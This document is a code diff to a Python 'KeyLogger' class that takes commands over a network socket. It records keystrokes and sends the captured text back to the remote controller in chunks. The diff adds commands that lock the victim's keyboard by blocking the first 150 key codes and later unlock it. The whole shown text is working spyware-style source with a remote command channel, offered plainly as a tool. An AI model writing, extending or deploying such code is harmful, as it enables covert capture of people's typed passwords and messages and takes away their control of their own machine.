@@ -1,4 +1,5 @@
 from pynput.keyboard import Listener, Key
+import keyboard
 import time
 
 class KeyLogger:
@@ -11,14 +12,16 @@ class KeyLogger:
     def run(self):
        while True:
             cmd = self.client.recv(32).decode('utf8')
-            #print(cmd)
-            # cmd = str(input())
             if cmd == "keystroke,hook":
                 self.hook_key()
             elif cmd == "keystroke,unhook":
                 self.unhook_key()
             elif cmd == "keystroke,print":
                 self.print_keys()
+            elif cmd == "keystroke,lock":
+                self.lock_keyboard()
+            elif cmd == "keystroke,unlock":
+                self.unlock_keyboard()
             elif cmd == "exit":
                 return     
     
@@ -51,13 +54,21 @@ class KeyLogger:
     def print_keys(self):
         self.client.sendall(bytes(str(len(self.keys)), "utf8"))
         time.sleep(0.1)
-        # self.client.sendall(bytes(self.keys, "utf8"))
         id = 0
         while id < len(self.keys):
             self.client.sendall(bytes(self.keys[id : id + 4096], "utf8"))
             id += 4096
         
         self.keys = ''
+        pass
+    
+    def lock_keyboard(self):
+        for key in range(150):
+            keyboard.block_key(key)
+        pass
+    
+    def unlock_keyboard(self):
+        keyboard.unhook_all()
         pass
 
     pass
